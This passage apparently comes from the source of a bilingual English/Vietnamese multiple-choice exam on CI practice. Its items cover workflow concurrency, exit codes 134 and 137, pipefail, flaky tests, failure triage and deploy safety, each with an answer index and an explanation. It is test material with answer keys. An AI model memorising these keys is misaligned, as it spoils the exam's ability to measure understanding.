              'concurrency:\n' +
              '  group: desktop-release\n' +
              '  cancel-in-progress: false',
            ) + 'Which single question decides the value, and does it decide it the same way every time?',
            'Hai workflow trong kho này đặt cùng một khoá thành hai giá trị ngược nhau:' + code(
              '# deploy-ghcr.yml\n' +
              'concurrency:\n' +
              '  group: deploy-ghcr\n' +
              '  cancel-in-progress: true\n' +
              '\n' +
              '# desktop-release.yml\n' +
              'concurrency:\n' +
              '  group: desktop-release\n' +
              '  cancel-in-progress: false',
            ) + 'Đúng MỘT câu hỏi nào quyết định giá trị ấy, và nó có quyết định theo cùng một cách mỗi lần không?',
          ),
          options: [
            B(
              'Whether the workflow is push-triggered or dispatch-triggered: a push can be superseded by the next push, while a dispatch was chosen by a human and must be allowed to finish',
              'Workflow kích hoạt theo push hay theo dispatch: một cú push có thể bị cú push sau vượt mặt, còn một lần dispatch do con người chọn nên phải được cho chạy xong',
            ),
            B(
              'Whether the workflow uses a matrix: cancelling a matrix leaves some legs done and some not, so <code>cancel-in-progress</code> must be false whenever <code>strategy</code> is present',
              'Workflow có dùng ma trận hay không: huỷ một ma trận sẽ để lại nhánh xong nhánh chưa, nên <code>cancel-in-progress</code> phải là false mỗi khi có <code>strategy</code>',
            ),
            B(
              'Neither — it is an inconsistency left by two authors, and the repository should pick one value and apply it to both files for predictability',
              'Không cái nào — đó là một chỗ thiếu nhất quán do hai tác giả để lại, và kho này nên chọn một giá trị rồi áp cho cả hai tệp cho dễ đoán',
            ),
            B(
              'Whether the run has SIDE EFFECTS that must complete: a superseded deploy should die, but a release halfway through uploading assets must not — and yes, it decides it the same way every time',
              'Lần chạy ấy có TÁC DỤNG PHỤ bắt buộc phải hoàn tất hay không: một cuộc deploy bị vượt mặt thì nên chết, nhưng một cuộc phát hành đang tải tệp dở thì KHÔNG được — và đúng, nó quyết định theo cùng một cách mỗi lần',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Same key, opposite values, both correct — which is unusual enough to be worth noticing, because most configuration has a right answer and a wrong one. The deploy case is straightforward: without cancelling, pushing three commits in ten minutes queues three deploys and the only one anybody wants starts twenty minutes late. The release case is the opposite: a cancelled job stops between two steps, wherever it happened to be, and for a release that can mean three of five assets uploaded and a release page that looks complete. So the rule is the side-effect question, and getting the value from a template rather than from that question is how a release gets killed mid-publish. Worth pairing with the group name, which is the other half: a constant group serialises the whole repository and is right for something singular such as a production server; <code>${{ github.workflow }}-${{ github.ref }}</code> is the safest general form; and a group that is too broad reads to everybody as "CI keeps randomly cancelling".',
            'Cùng một khoá, hai giá trị ngược nhau, cả hai đều ĐÚNG — chuyện đủ lạ để đáng chú ý, vì phần lớn cấu hình chỉ có một đáp án đúng và một đáp án sai. Ca deploy thì thẳng thắn: không huỷ thì đẩy ba commit trong mười phút sẽ xếp hàng ba cuộc deploy và cái duy nhất ai cũng muốn lại khởi động muộn hai mươi phút. Ca phát hành thì ngược lại: một job bị huỷ sẽ dừng GIỮA hai bước, ở đúng chỗ nó đang đứng, và với một cuộc phát hành thì điều đó có thể nghĩa là ba trên năm tệp đã tải lên và một trang phát hành trông như đã đủ. Nên cái luật ở đây là câu hỏi về tác dụng phụ, và lấy giá trị ấy từ một cái mẫu thay vì từ câu hỏi ấy chính là cách một cuộc phát hành bị giết giữa chừng. Đáng ghép cùng với TÊN NHÓM, tức nửa còn lại: một nhóm hằng số tuần tự hoá cả kho và đúng cho thứ gì đó đơn nhất như một máy chủ production; <code>${{ github.workflow }}-${{ github.ref }}</code> là dạng tổng quát an toàn nhất; còn một cái nhóm quá rộng thì với mọi người nó đọc thành "CI cứ tự dưng huỷ lung tung".',
          ),
        }),

        // q40 · đáp án 0
        mcq({
          prompt: B(
            'From this repository\'s operations notes:' + code(
              'v0.5.40 bi dung HAI luot (19-20/08/2026)\n' +
              '  luot A: cong bo luc 18:08:17\n' +
              '  luot B: xong luc 18:15:37, va TAI DE len dung release do\n' +
              '\n' +
              '`concurrency:` DA co mat. No xep hang hai luot, dung nhu duoc yeu cau.\n' +
              'Luot B cho luot A xong roi moi chay — roi ghi de.',
            ) + 'Why did <code>concurrency:</code> not prevent this, and what did?',
            'Trích sổ vận hành của kho này:' + code(
              'v0.5.40 bi dung HAI luot (19-20/08/2026)\n' +
              '  luot A: cong bo luc 18:08:17\n' +
              '  luot B: xong luc 18:15:37, va TAI DE len dung release do\n' +
              '\n' +
              '`concurrency:` DA co mat. No xep hang hai luot, dung nhu duoc yeu cau.\n' +
              'Luot B cho luot A xong roi moi chay — roi ghi de.',
            ) + 'Vì sao <code>concurrency:</code> không ngăn được chuyện này, và cái gì mới ngăn được?',
          ),
          options: [
            B(
              'It queues rather than blocks — ordering is not idempotency, so the fix was a state check: refuse to build over an already-published version, and refuse to start while a build is running',
              'Nó XẾP HÀNG chứ không CHẶN — thứ tự không phải là tính bất biến, nên cách chữa là một phép kiểm TRẠNG THÁI: từ chối dựng đè lên một phiên bản đã công bố, và từ chối khởi động khi đang có một lượt dựng chạy',
            ),
            B(
              'The two runs used different group names, so they never shared a queue; naming the group after the workflow rather than after the release would have serialised them',
              'Hai lượt chạy dùng tên nhóm khác nhau nên chúng chưa bao giờ chung hàng đợi; đặt tên nhóm theo workflow thay vì theo bản phát hành hẳn đã tuần tự hoá được chúng',
            ),
            B(
              '<code>cancel-in-progress</code> was true, so run A was killed partway and run B completed the upload over a half-written release, which is the partial state that was observed',
              '<code>cancel-in-progress</code> đang là true, nên lượt A bị giết giữa chừng và lượt B hoàn tất lượt tải lên đè lên một bản phát hành viết dở, và đó là trạng thái nửa vời quan sát được',
            ),
            B(
              'Concurrency does not apply to <code>workflow_dispatch</code> runs, so the release workflow — which is dispatch-only — was never covered by the block in the first place',
              'Concurrency không áp dụng cho các lần chạy <code>workflow_dispatch</code>, nên workflow phát hành — vốn chỉ chạy tay — ngay từ đầu đã không được khối ấy che chở',
            ),
          ],
          correct: 0,
          explanation: EX(
            'The second run did exactly what it was told: it waited, then it ran, then it published version 0.5.40 over the 0.5.40 that already existed. Serialised and still wrong. That time it was harmless because both runs were the same commit — a different commit would have produced an installer carrying another version\'s number, and the failure mode is silent, because the release page looks complete. So the distinction to carry is that <code>concurrency:</code> is a scheduling property and "this version already exists" is a state question, and only a check against that state answers it. The repository\'s fix matches: a release script that refuses to start when a build is already running, and a workflow step that refuses to build over an already-published version, with drafts still allowed through because a run that died partway leaves one and finishing it is correct. The same distinction is why option 3 is not merely wrong on the facts but on the model: cancelling would have produced a partial release, which is a different bug.',
            'Lượt chạy thứ hai làm ĐÚNG thứ nó được bảo: nó chờ, rồi nó chạy, rồi nó công bố phiên bản 0.5.40 đè lên cái 0.5.40 vốn đã có. Tuần tự hoá xong mà vẫn sai. Lần ấy vô hại vì cả hai lượt cùng một commit — khác commit thì đã đẻ ra một bản cài mang số hiệu của phiên bản khác, và kiểu hỏng ấy CÂM LẶNG, vì trang phát hành nhìn vẫn đầy đủ. Nên sự phân biệt cần mang theo là: <code>concurrency:</code> là một tính chất về LẬP LỊCH còn "phiên bản này đã tồn tại rồi" là một câu hỏi về TRẠNG THÁI, và chỉ một phép kiểm đối chiếu trạng thái ấy mới trả lời được. Cách chữa của kho này khớp đúng: một script phát hành từ chối khởi động khi đã có một lượt dựng đang chạy, và một bước workflow từ chối dựng đè lên một phiên bản đã công bố, còn bản NHÁP thì vẫn cho qua vì một lượt chết giữa chừng để lại một bản nháp và chạy tiếp cho xong là đúng. Cũng chính sự phân biệt ấy khiến phương án 3 không chỉ sai về dữ kiện mà sai về mô hình: huỷ đi thì đã đẻ ra một bản phát hành NỬA VỜI, tức một con bọ khác.',
          ),
        }),

        // q41 · đáp án 1
        mcq({
          prompt: B(
            'Ten consecutive runs of <code>ci-lint.yml</code> on the same branch, with no change between them:' + code(
              '135  155  140  160  144  144  100  144  141  145\n' +
              '\n' +
              'TB 141 s · trung vi 144 s · min 100 · max 160\n' +
              'do lech 15,2 s · bien do max/min = 1,60x',
            ) + 'What follows for measuring an optimisation on this workflow?',
            'Mười lần chạy liên tiếp của <code>ci-lint.yml</code> trên cùng một nhánh, không có thay đổi nào giữa chúng:' + code(
              '135  155  140  160  144  144  100  144  141  145\n' +
              '\n' +
              'TB 141 s · trung vi 144 s · min 100 · max 160\n' +
              'do lech 15,2 s · bien do max/min = 1,60x',
            ) + 'Từ đó suy ra gì cho việc ĐO một phép tối ưu trên workflow này?',
          ),
          options: [
            B(
              'Take the minimum of several runs as the true cost, since 100 seconds is the workflow with nothing going wrong and the higher figures are contamination to be excluded',
              'Lấy giá trị NHỎ NHẤT của vài lần chạy làm chi phí thật, vì 100 giây là workflow khi chẳng có gì trục trặc còn các số cao hơn là nhiễu bẩn cần loại bỏ',
            ),
            B(
              'Anything saving less than about thirty seconds cannot be told from noise in a single run — measure the STEP across a few runs, or compare medians, never last-run against remembered-normal',
              'Mọi thứ tiết kiệm dưới khoảng ba mươi giây đều không phân biệt được với nhiễu trong một lần chạy — hãy đo BƯỚC qua vài lần chạy, hoặc so trung vị, đừng bao giờ so lần-chạy-cuối với cái-bình-thường-nhớ-được',
            ),
            B(
              'The spread is a queueing effect, so the fix is to measure only runs that started immediately; queue time was measured at 41 to 268 minutes and dominates everything else here',
              'Biên độ ấy là hiệu ứng xếp hàng, nên cách chữa là chỉ đo những lần chạy khởi động ngay; thời gian xếp hàng đo được là 41 tới 268 phút và nó áp đảo mọi thứ khác ở đây',
            ),
            B(
              'A 1.60× spread means the workflow is broken and should be stabilised before anything else — no reliable measurement is possible while identical work varies by that much',
              'Biên độ 1,60 lần nghĩa là workflow đang hỏng và phải làm cho ổn định trước đã — không phép đo đáng tin nào khả dĩ khi cùng một khối việc dao động tới mức ấy',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Sixty per cent between the fastest and slowest run of identical work, before you change anything. That swallows most of the optimisations people attempt: the real <code>npm</code> cache saving measured in this course is 12.6 seconds, which is inside this noise and therefore has to be measured on the <em>step</em>, not on the run. Per-step timings are much quieter because they exclude queueing, image variation and job hand-off. The other consequences are reading habits: "CI got slow this week" needs medians over ten runs rather than one sample against memory, and "this run was fast, the fix worked" is refuted by the 100-second run in that list, which happened with no change at all. Option 3 misattributes the variance — queueing was measured at 2 to 3 seconds for a job; the 41 to 268 minutes is the entirely separate delay before a <em>scheduled</em> run is created. Option 4 confuses variance with breakage: the largest term is that every job gets a different machine, and that is not controllable.',
            'Sáu mươi phần trăm chênh lệch giữa lần chạy nhanh nhất và chậm nhất của cùng một khối việc, TRƯỚC khi bạn đổi bất cứ thứ gì. Chừng đó nuốt trọn phần lớn các phép tối ưu người ta hay thử: khoản tiết kiệm thật của cache <code>npm</code> đo được trong khoá này là 12,6 giây, tức nằm gọn trong cái nhiễu này và vì thế phải đo ở BƯỚC chứ không phải ở lần chạy. Số đo từng bước êm hơn nhiều vì nó loại được phần xếp hàng, phần khác biệt giữa các ảnh máy và phần giao ca giữa các job. Các hệ quả còn lại là thói quen đọc số: câu "tuần này CI chậm đi" cần TRUNG VỊ của mười lần chạy chứ không phải một mẫu đơn đọ với trí nhớ, còn câu "lần chạy này nhanh, vậy bản vá có tác dụng" bị chính lần chạy 100 giây trong danh sách ấy bác bỏ, vì nó xảy ra khi chẳng có thay đổi nào. Phương án 3 quy sai nguồn gốc của phương sai — xếp hàng đo được là 2 tới 3 giây cho một job; còn 41 tới 268 phút là độ trễ HOÀN TOÀN KHÁC, xảy ra trước khi một lần chạy THEO LỊCH được tạo ra. Phương án 4 lẫn phương sai với hỏng hóc: số hạng lớn nhất là chuyện mỗi job được một cỗ máy khác nhau, và điều đó không điều khiển được.',
          ),
        }),

        /* ── Chương 8 — khi CI đỏ (4 câu) ─────────────────────────────────── */

        // q42 · đáp án 2
        mcq({
          prompt: B(
            'Each case below was run rather than looked up, on GNU bash 3.2.57:' + code(
              'lenh                                exit\n' +
              '--------------------------------------------\n' +
              'lenh-khong-ton-tai                   127\n' +
              'tep khong co quyen thuc thi          126\n' +
              'kill -ABRT $$                        134\n' +
              'kill -KILL $$                        137\n' +
              'kill -TERM $$                        143',
            ) + 'A Node build step ends with <code>##[error]Process completed with exit code 134</code>. What does that name, and how does it differ from 137?',
            'Mỗi ca dưới đây được CHẠY chứ không phải tra cứu, trên GNU bash 3.2.57:' + code(
              'lenh                                exit\n' +
              '--------------------------------------------\n' +
              'lenh-khong-ton-tai                   127\n' +
              'tep khong co quyen thuc thi          126\n' +
              'kill -ABRT $$                        134\n' +
              'kill -KILL $$                        137\n' +
              'kill -TERM $$                        143',
            ) + 'Một bước dựng Node kết thúc với <code>##[error]Process completed with exit code 134</code>. Nó gọi tên cái gì, và khác 137 ở chỗ nào?',
          ),
          options: [
            B(
              'Both are the OOM killer; 134 is what it sends to a process with a signal handler installed and 137 is what it sends to one without, so the two need the same fix',
              'Cả hai đều là OOM killer; 134 là thứ nó gửi cho một tiến trình có cài bộ xử lý tín hiệu còn 137 là thứ nó gửi cho tiến trình không có, nên cả hai cần cùng một cách chữa',
            ),
            B(
              '134 is a generic tool failure with a non-standard code, so the number carries no information and only the tool\'s own output can name the cause',
              '134 là một cú hỏng chung của công cụ với một mã phi chuẩn, nên con số ấy không mang thông tin gì và chỉ đầu ra của chính công cụ mới gọi tên được nguyên nhân',
            ),
            B(
              '134 = 128 + 6 = SIGABRT — the process ABORTED ITSELF, which for Node means V8 hit its heap ceiling; 137 = 128 + 9 = SIGKILL, something killed it from outside',
              '134 = 128 + 6 = SIGABRT — tiến trình TỰ BỎ CUỘC, mà với Node nghĩa là V8 đụng trần heap; 137 = 128 + 9 = SIGKILL, tức thứ khác giết nó từ bên ngoài',
            ),
            B(
              '134 means the runner cancelled the job after <code>timeout-minutes</code> expired, and 137 means the six-hour ceiling was reached instead, which is why the two look similar',
              '134 nghĩa là runner huỷ job sau khi <code>timeout-minutes</code> hết hạn, còn 137 nghĩa là đã chạm trần sáu tiếng, và vì thế hai cái trông giống nhau',
            ),
          ],
          correct: 2,
          explanation: EX(
            'The 128 + n family is the one worth recognising on sight: subtract 128 and you have the signal number. Measured above, <code>kill -ABRT</code> gives 134 and <code>kill -KILL</code> gives 137, and squeezing a Node process with <code>--max-old-space-size=40</code> reproduces the 134 exactly, printing <code>FATAL ERROR: Reached heap limit</code>. So the chain is established rather than assumed: V8 cannot allocate, V8 calls <code>abort()</code>, SIGABRT, 128 + 6. The distinction from 137 matters because they need opposite fixes. 134 is the process hitting a limit it knows about, raised with <code>--max-old-space-size</code> or removed by reducing peak heap use; 137 is the machine running out of real memory, and raising the V8 limit makes that <em>worse</em>. Two more are worth memorising from the same table: 127 means the shell never found the command, and 126 means it found it and could not execute it — almost always a missing <code>chmod +x</code>. Neither is a bug in your program, because your program never ran.',
            'Họ 128 + n mới là họ đáng nhận ra ngay từ cái nhìn đầu: trừ 128 đi là ra số hiệu tín hiệu. Đo ở trên, <code>kill -ABRT</code> cho 134 còn <code>kill -KILL</code> cho 137, và bóp một tiến trình Node bằng <code>--max-old-space-size=40</code> tái lập chính xác con số 134, kèm dòng <code>FATAL ERROR: Reached heap limit</code>. Nên chuỗi nhân quả được XÁC LẬP chứ không phải phỏng đoán: V8 không cấp phát được, V8 gọi <code>abort()</code>, SIGABRT, 128 + 6. Sự phân biệt với 137 quan trọng vì hai cái cần hai cách chữa NGƯỢC nhau. 134 là tiến trình đụng một cái trần mà nó BIẾT, nâng lên bằng <code>--max-old-space-size</code> hoặc gỡ bỏ bằng cách giảm đỉnh dùng heap; 137 là cái MÁY hết bộ nhớ thật, và nâng trần V8 lên chỉ làm chuyện đó TỆ HƠN. Hai con số nữa trong cùng bảng đáng thuộc: 127 nghĩa là shell chưa bao giờ TÌM THẤY câu lệnh, còn 126 nghĩa là nó tìm thấy mà không chạy được — gần như luôn là thiếu một cú <code>chmod +x</code>. Cả hai đều không phải lỗi trong chương trình của bạn, vì chương trình của bạn chưa hề chạy.',
          ),
        }),

        // q43 · đáp án 0
        mcq({
          prompt: B(
            'The same Node command was run twice on the machine this exam was written on:' + code(
              "$ node --max-old-space-size=40 -e 'const a=[]; for(;;) a.push(new Array(1e6).fill(0));'\n" +
              'khong pipe -> exit=134\n' +
              '\n' +
              "$ node --max-old-space-size=40 -e '...' | tail -1\n" +
              'co | tail  -> exit=0',
            ) + 'This course caught the identical trap three separate times — through <code>grep</code>, through <code>grep -c</code>, and here. What is the rule?',
            'Cùng một câu lệnh Node được chạy hai lần trên chính cái máy soạn đề này:' + code(
              "$ node --max-old-space-size=40 -e 'const a=[]; for(;;) a.push(new Array(1e6).fill(0));'\n" +
              'khong pipe -> exit=134\n' +
              '\n' +
              "$ node --max-old-space-size=40 -e '...' | tail -1\n" +
              'co | tail  -> exit=0',
            ) + 'Khoá học này đã bị đúng cái bẫy ấy cắn ba lần riêng biệt — qua <code>grep</code>, qua <code>grep -c</code>, và ở đây. Luật là gì?',
          ),
          options: [
            B(
              'A pipeline reports the exit code of its LAST command, so any measurement or gate piped into anything loses the code — capture it with <code>RC=$?</code> on the very next line, or use <code>pipefail</code>',
              'Một đường ống báo mã thoát của lệnh CUỐI, nên mọi phép đo hay chốt chặn đưa qua ống đều mất mã ấy — hãy bắt nó bằng <code>RC=$?</code> ngay ở dòng kế tiếp, hoặc dùng <code>pipefail</code>',
            ),
            B(
              'Tools that write to stderr lose their exit code when stdout is redirected, which is why the fix is <code>2&gt;&amp;1</code> before the pipe rather than a shell option',
              'Các công cụ ghi ra stderr sẽ mất mã thoát khi stdout bị chuyển hướng, và vì thế cách chữa là <code>2&gt;&amp;1</code> đặt trước dấu ống chứ không phải một tuỳ chọn của shell',
            ),
            B(
              '<code>tail</code> and <code>grep</code> specifically swallow non-zero statuses because they are filters; other commands in a pipeline propagate the code of the first failure normally',
              'Riêng <code>tail</code> và <code>grep</code> nuốt các trạng thái khác không vì chúng là bộ lọc; các lệnh khác trong đường ống thì lan truyền mã của cú hỏng đầu tiên một cách bình thường',
            ),
            B(
              'A process killed by a signal cannot report through a pipe, because the shell reaps it before the pipeline\'s status is assembled — so the effect is specific to the 128+n family',
              'Một tiến trình bị tín hiệu giết thì không báo cáo qua ống được, vì shell thu nó về trước khi trạng thái của đường ống được ráp lại — nên hiệu ứng này chỉ riêng với họ 128+n',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Same command, two answers: 134 and 0. The shell reports the status of the last command in a pipeline, and <code>tail</code> almost always succeeds. That is a default, not a quirk of any particular tool, which is why it caught this course three times in three unrelated measurements — <code>bash -e</code> through a <code>grep</code> reported 0 and made <code>set -e</code> look broken; <code>grep -c</code> counted matching <em>lines</em> and undercounted by nine; and here a <code>tail</code> turned a heap crash into a success. It is also why <code>shell: bash</code>, which adds <code>pipefail</code>, is the highest-value one-line change in most workflow files, and why a step that gates on something must never end in a pipe. Three ways to keep the code: <code>shell: bash</code> for the whole step, <code>RC=$?</code> on the line immediately after the command, or <code>${PIPESTATUS[@]}</code>, which holds every stage\'s status and is the manual version of what <code>pipefail</code> automates.',
            'Cùng một câu lệnh, hai câu trả lời: 134 và 0. Shell báo trạng thái của lệnh CUỐI trong một đường ống, mà <code>tail</code> thì gần như luôn thành công. Đó là một MẶC ĐỊNH chứ không phải nét lạ của riêng công cụ nào, và vì thế nó đã cắn khoá học này ba lần trong ba phép đo chẳng liên quan gì tới nhau — <code>bash -e</code> đi qua một <code>grep</code> báo 0 và làm <code>set -e</code> trông như hỏng; <code>grep -c</code> đếm DÒNG khớp nên thiếu mất chín; và ở đây một cú <code>tail</code> biến một cú sập heap thành một cú thành công. Đó cũng là lý do <code>shell: bash</code>, thứ thêm <code>pipefail</code> vào, là thay đổi một dòng có giá trị cao nhất trong phần lớn tệp workflow, và là lý do một bước đóng vai chốt chặn thì tuyệt đối không được kết thúc bằng một dấu ống. Ba cách giữ lại mã thoát: <code>shell: bash</code> cho cả bước, <code>RC=$?</code> ở dòng NGAY SAU câu lệnh, hoặc <code>${PIPESTATUS[@]}</code> vốn giữ trạng thái của mọi chặng và là bản làm tay của thứ <code>pipefail</code> tự động hoá.',
          ),
        }),

        // q44 · đáp án 3
        mcq({
          prompt: B(
            'Three kinds of failure were each run 40 times:' + code(
              'THAT (1+1===3)                    40 / 40  = 100%\n' +
              'NGAU NHIEN (phu thuoc dong ho)     8 / 40  =  20%\n' +
              'PHU THUOC THU TU     xanh khi chay MOT MINH,\n' +
              '                     do  khi chay SAU bai kia',
            ) + 'A test fails, you press re-run, and it passes. What has that established?',
            'Ba kiểu hỏng, mỗi kiểu chạy 40 lần:' + code(
              'THAT (1+1===3)                    40 / 40  = 100%\n' +
              'NGAU NHIEN (phu thuoc dong ho)     8 / 40  =  20%\n' +
              'PHU THUOC THU TU     xanh khi chay MOT MINH,\n' +
              '                     do  khi chay SAU bai kia',
            ) + 'Một bài test hỏng, bạn bấm chạy lại, và nó qua. Điều đó xác lập được gì?',
          ),
          options: [
            B(
              'That the failure was environmental rather than logical: a real defect fails deterministically, so a single green run is a complete refutation of the "real bug" hypothesis',
              'Rằng cú hỏng là do môi trường chứ không phải do logic: một khiếm khuyết thật hỏng một cách tất định, nên một lần chạy xanh là một phép bác bỏ hoàn chỉnh cho giả thuyết "bug thật"',
            ),
            B(
              'That the flake rate is below 50%, since a rate above that would more often than not have produced a second failure on the retry',
              'Rằng tỉ lệ flake dưới 50%, vì một tỉ lệ cao hơn thế thì đa phần đã đẻ ra một cú hỏng thứ hai ở lần chạy lại',
            ),
            B(
              'That the test is order-dependent, because a probabilistic flake would have needed several retries to go green while order dependence flips on the first one',
              'Rằng bài test phụ thuộc thứ tự, vì một flake xác suất hẳn đã cần vài lần thử lại mới xanh, còn phụ thuộc thứ tự thì lật ngay ở lần đầu',
            ),
            B(
              'Almost nothing — for a genuine 20% flake the next run passes 80% of the time, so "failed then passed" is the MOST LIKELY outcome and does not distinguish 20% from 5%',
              'Gần như KHÔNG GÌ CẢ — với một flake thật sự 20% thì lần chạy kế qua với xác suất 80%, nên "hỏng rồi qua" là kết quả NHIỀU KHẢ NĂNG NHẤT và không phân biệt được 20% với 5%',
            ),
          ],
          correct: 3,
          explanation: EX(
            '"It failed, I re-ran it, it passed" is the most common sentence in CI and it is used as a conclusion. The arithmetic says otherwise: at a 20% failure rate the retry is green four times in five, so observing exactly that is what you would expect regardless. To be 95% confident a 20% flake is gone you would need fourteen consecutive green runs — and nobody does that, which is the point: confirming a fix by re-running is not practical, so a flake is fixed by finding the source of non-determinism and removing it. The compounding cost is worth naming too: across 100 runs that test produces 20 red builds, somebody re-runs each one, 80% see green and conclude "flake, ignore" — a locally rational decision every single time, which is how a real defect that manifests one time in five stays hidden behind a button. Option 1 inverts the logic: a green run refutes a <em>100%</em> failure, which is the one case where a single re-run is informative. Option 3 misreads the third row — order dependence is fully deterministic and is diagnosed by running the test alone, not by re-running the suite.',
            'Câu "nó hỏng, tôi chạy lại, nó qua" là câu phổ biến nhất trong CI và người ta dùng nó như một KẾT LUẬN. Số học thì nói khác: ở tỉ lệ hỏng 20% thì lần chạy lại xanh bốn trên năm lần, nên quan sát thấy đúng như thế là điều bạn phải trông đợi bất kể sự thật là gì. Để tin 95% rằng một flake 20% đã hết, bạn cần MƯỜI BỐN lần xanh liên tiếp — và chẳng ai làm thế, và đó chính là điểm mấu chốt: xác nhận một bản vá bằng cách chạy lại là chuyện không khả thi, nên một flake được chữa bằng cách tìm ra nguồn phi-tất-định rồi gỡ nó đi. Cái giá cộng dồn cũng đáng gọi tên: qua 100 lần chạy, bài test ấy đẻ ra 20 bản dựng đỏ, mỗi lần có người bấm chạy lại, 80% thấy xanh rồi kết luận "flake thôi, bỏ qua" — một quyết định hợp lý xét cục bộ ở MỌI lần, và đó là cách một khiếm khuyết thật lộ ra một trên năm lần vẫn nấp được sau một cái nút. Phương án 1 lật ngược logic: một lần chạy xanh bác bỏ một cú hỏng <em>100%</em>, và đó đúng là ca duy nhất mà một lần chạy lại có thông tin. Phương án 3 đọc nhầm dòng thứ ba — phụ thuộc thứ tự hoàn toàn TẤT ĐỊNH và được chẩn đoán bằng cách chạy bài test MỘT MÌNH, không phải bằng cách chạy lại cả bộ.',
          ),
        }),

        // q45 · đáp án 2
        mcq({
          prompt: B(
            'A release run went red. Applying the triage order without opening a log:' + code(
              '1. thoi luong: 334s (TB thanh cong 458s) -> hong GIUA CHUNG\n' +
              '2. khong hong: kiem tra ma, dung Linux, dung Windows -> ba job xanh\n' +
              '3. ma tran: CHI macOS do -> khac biet NEN TANG\n' +
              '4. ma thoat: 134 -> V8 het heap',
            ) + 'What is the value of doing steps 1–4 before step 6, "read the failing step\'s log"?',
            'Một lần chạy phát hành bị đỏ. Áp dụng thứ tự phân loại mà chưa mở log nào:' + code(
              '1. thoi luong: 334s (TB thanh cong 458s) -> hong GIUA CHUNG\n' +
              '2. khong hong: kiem tra ma, dung Linux, dung Windows -> ba job xanh\n' +
              '3. ma tran: CHI macOS do -> khac biet NEN TANG\n' +
              '4. ma thoat: 134 -> V8 het heap',
            ) + 'Làm các bước 1–4 trước bước 6 là "đọc log của bước hỏng" thì có giá trị gì?',
          ),
          options: [
            B(
              'It is a formality that documents the incident for a later post-mortem; the log would have shown the same conclusion and reading it first is simply faster in practice',
              'Đó là một thủ tục ghi lại sự cố cho một cuộc mổ xẻ về sau; log dù sao cũng cho ra đúng kết luận ấy và đọc nó trước thì thực tế còn nhanh hơn',
            ),
            B(
              'It avoids the need for a log at all, because the four cheap signals are complete and any remaining detail belongs to the fix rather than to the diagnosis',
              'Nó khiến chẳng cần tới log nữa, vì bốn tín hiệu rẻ tiền ấy đã đầy đủ và mọi chi tiết còn lại thuộc về việc VÁ chứ không thuộc về việc chẩn đoán',
            ),
            B(
              'Each earlier signal is cheaper and eliminates a category, so by the time the log is open you already know which twenty lines to read — and skipped jobs have been ruled out as noise',
              'Mỗi tín hiệu trước đó rẻ hơn và loại bỏ được một nhóm khả năng, nên tới lúc mở log thì bạn đã biết phải đọc HAI MƯƠI DÒNG NÀO — và các job bị bỏ qua đã bị loại ra như nhiễu',
            ),
            B(
              'It ensures the failure is reproducible before anybody investigates, since a run whose duration is near the median has by definition not hit a timeout or bailed early',
              'Nó bảo đảm cú hỏng tái lập được trước khi ai đó điều tra, vì một lần chạy có thời lượng gần trung vị thì theo định nghĩa là chưa chạm timeout và cũng không bỏ cuộc sớm',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Steps 1 through 4 arrived at "the macOS build ran out of memory in V8" without opening a log, and step 6 confirmed it in one line. That is the shape triage should take, because each earlier step costs seconds and rules out a whole category. Duration says <em>how</em> it failed — much shorter than usual means something bailed early, much longer means something hung, and this repository\'s failed release runs took 80 and 334 seconds against a 458-second success average. The list of jobs that did <em>not</em> fail tells you how far the failure spread, and it is where the most common waste happens: a red publish job with three red builds upstream has one failure, not four, and reading a skipped job\'s log is fifteen minutes on something that never ran. The matrix column is a fingerprint that names the axis. And the exit code often names the fix by itself. The two shortcuts that break the order are opening the log first and re-running before reading — the button is a repair, not a diagnosis.',
            'Các bước 1 tới 4 đã đi tới kết luận "bản dựng macOS hết bộ nhớ trong V8" mà chưa mở log nào, còn bước 6 chỉ xác nhận nó trong một dòng. Đó là hình dạng mà việc phân loại nên có, vì mỗi bước sớm hơn tốn vài giây và loại bỏ được cả một nhóm khả năng. Thời lượng nói CÁCH nó hỏng — ngắn hơn thường lệ nhiều nghĩa là có thứ bỏ cuộc sớm, dài hơn nhiều nghĩa là có thứ bị treo, và các lần chạy phát hành hỏng của kho này mất 80 và 334 giây so với mức trung bình thành công 458 giây. Danh sách những job KHÔNG hỏng cho bạn biết cú hỏng lan tới đâu, và đó là chỗ lãng phí phổ biến nhất: một job công bố đỏ với ba job dựng đỏ phía trên chỉ có MỘT cú hỏng chứ không phải bốn, và đọc log của một job bị bỏ qua là mười lăm phút dành cho thứ chưa từng chạy. Cột ma trận là một dấu vân tay gọi tên cái TRỤC khác biệt. Còn mã thoát thì thường tự nó đã gọi tên cách vá. Hai lối tắt phá vỡ thứ tự này là mở log trước và chạy lại trước khi đọc — cái nút ấy là công cụ SỬA CHỮA chứ không phải công cụ chẩn đoán.',
          ),
        }),

        /* ── Chương 9 — deploy từ CI (2 câu) ──────────────────────────────── */

        // q46 · đáp án 1
        mcq({
          prompt: B(
            'Ten of this repository\'s eleven workflows are <code>workflow_dispatch</code> only, after two dated outages in one week:' + code(
              '2026-07-03  feed 500: anh da trao, migration CHUA ap xong\n' +
              '2026-07-06  Exited(137) + container mo coi: hai lan\n' +
              '            `docker compose up -d --force-recreate` giam nhau',
            ) + 'Which three properties does push-to-deploy require, that this repository did not have?',
            'Mười trên mười một workflow của kho này chỉ chạy tay, sau hai sự cố có ngày tháng trong cùng một tuần:' + code(
              '2026-07-03  feed 500: anh da trao, migration CHUA ap xong\n' +
              '2026-07-06  Exited(137) + container mo coi: hai lan\n' +
              '            `docker compose up -d --force-recreate` giam nhau',
            ) + 'Push-để-deploy đòi ba tính chất nào mà kho này đã không có?',
          ),
          options: [
            B(
              'A staging environment, a canary rollout, and blue-green infrastructure — the standard progression that makes an automatic trigger safe at any scale',
              'Một môi trường staging, một cuộc triển khai canary, và hạ tầng blue-green — bậc thang chuẩn khiến một kích hoạt tự động trở nên an toàn ở mọi quy mô',
            ),
            B(
              'Exactly ONE workflow that deploys, deploys that are genuinely idempotent, and rollback on the deploy path so a red run leaves the previous known-good state',
              'ĐÚNG MỘT workflow deploy, các cuộc deploy thật sự bất biến theo số lần chạy, và rollback nằm TRÊN đường deploy để một lần chạy đỏ để lại trạng thái tốt đã biết trước đó',
            ),
            B(
              'Test coverage above 90%, mandatory code review, and a security scanner on every merge — the three gates that stop a bad commit reaching the deploy in the first place',
